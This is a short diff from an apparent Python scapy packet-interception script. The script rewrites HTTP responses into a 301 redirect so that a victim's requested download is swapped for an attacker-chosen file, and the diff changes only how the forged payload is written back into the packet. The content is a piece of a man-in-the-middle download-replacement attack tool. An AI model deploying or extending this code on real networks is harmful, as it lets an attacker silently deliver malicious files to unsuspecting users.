@@ -46,7 +46,8 @@ def process_packet(packet):
 
                 load = "HTTP/1.1 301 Moved Permanently\nLocation: " + str(replace_download_link) + "\n\n"
                 modified_packet = set_load(scapy_packet, load)
-                packet.set_payload(bytes(modified_packet))
+                packet.set_payload(modified_packet)
+                # packet.payload = modified_packet.payload
                 print("[+] File replaced")
 
     packet.accept()
